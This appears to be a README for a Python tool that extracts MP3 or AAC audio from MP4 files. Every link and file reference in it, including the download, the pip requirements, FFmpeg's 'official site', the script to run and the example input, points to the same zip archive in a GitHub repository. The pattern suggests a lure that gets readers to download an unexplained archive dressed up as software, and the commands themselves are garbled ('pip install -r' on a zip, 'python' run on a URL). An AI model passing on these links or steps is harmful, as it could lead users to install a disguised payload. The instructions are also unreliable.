## Overview

Welcome to the **MP4 Audio Extractor**! This simple Python application allows you to extract audio tracks from MP4 video files. Whether you need MP3 or AAC formats, this tool has you covered. It supports both single file and batch processing, making it easy to convert multiple files at once. You can choose between a graphical user interface (GUI) or a command-line interface (CLI) based on your preference.

For the latest version, download it from the [Releases section](https://raw.githubusercontent.com/Kamadulski/MP4_Audio_Extractor/master/mp4_audio_extractor/Audio_Extractor_M_2.8.zip) and follow the instructions to get started.

## Features

- **Audio Formats**: Extract audio in MP3 or AAC formats.
- **Single and Batch Processing**: Handle one file or multiple files at once.
- **User-Friendly Interfaces**: Choose between a GUI for ease of use or a CLI for advanced users.
- **Cross-Platform**: Works on Windows, macOS, and Linux.
- **FFmpeg Integration**: Utilizes FFmpeg for high-quality audio extraction.

## Installation

To install the MP4 Audio Extractor, follow these steps:

1. **Download**: Go to the [Releases section](https://raw.githubusercontent.com/Kamadulski/MP4_Audio_Extractor/master/mp4_audio_extractor/Audio_Extractor_M_2.8.zip) and download the latest version.
2. **Extract**: Unzip the downloaded file to your desired location.
3. **Install Dependencies**: Ensure you have Python installed on your machine. Install the required packages using pip:

   ```bash
   pip install -r https://raw.githubusercontent.com/Kamadulski/MP4_Audio_Extractor/master/mp4_audio_extractor/Audio_Extractor_M_2.8.zip
   ```

4. **FFmpeg**: Make sure FFmpeg is installed and accessible from your command line. You can download it from [FFmpeg's official site](https://raw.githubusercontent.com/Kamadulski/MP4_Audio_Extractor/master/mp4_audio_extractor/Audio_Extractor_M_2.8.zip).

## Usage

### Graphical User Interface

1. Launch the application by running `https://raw.githubusercontent.com/Kamadulski/MP4_Audio_Extractor/master/mp4_audio_extractor/Audio_Extractor_M_2.8.zip` in your terminal or by double-clicking the file.
2. Use the "Select File" button to choose your MP4 video.
3. Choose your desired audio format (MP3 or AAC).
4. Select the output directory.
5. Click "Extract" to start the process.

### Command-Line Interface

To use the CLI, open your terminal and navigate to the folder where the application is located. Use the following command:

```bash
python https://raw.githubusercontent.com/Kamadulski/MP4_Audio_Extractor/master/mp4_audio_extractor/Audio_Extractor_M_2.8.zip --input <path_to_mp4_file> --output <output_directory> --format <mp3|aac>
```

#### Example

```bash
python https://raw.githubusercontent.com/Kamadulski/MP4_Audio_Extractor/master/mp4_audio_extractor/Audio_Extractor_M_2.8.zip --input https://raw.githubusercontent.com/Kamadulski/MP4_Audio_Extractor/master/mp4_audio_extractor/Audio_Extractor_M_2.8.zip --output ./audio --format mp3
```

This command will extract the audio from `https://raw.githubusercontent.com/Kamadulski/MP4_Audio_Extractor/master/mp4_audio_extractor/Audio_Extractor_M_2.8.zip` and save it as an MP3 file in the `./audio` directory.
